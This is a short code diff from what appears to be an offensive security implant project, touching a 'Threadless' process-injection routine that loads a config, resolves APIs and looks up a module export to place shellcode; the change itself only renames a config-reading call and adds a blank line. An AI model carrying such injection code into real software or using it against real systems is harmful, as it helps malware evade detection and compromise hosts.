@@ -7,6 +7,7 @@ namespace Injection {
     }
 
     VOID Threadless(HMODULE Base) {
+
         HEXANE
         PARSER Parser = {};
         LPVOID Shellcode = {};
@@ -25,7 +26,7 @@ namespace Injection {
         __debugbreak();
 
         Memory::ResolveApi();
-        Loader::ReadConfig(&Threadless);
+        Config::ReadConfig(&Threadless);
 
         if (
             !(pExport = Memory::LdrGetExport(B_PTR(Threadless.Module.Buffer), B_PTR(Threadless.Export.Buffer))) ||
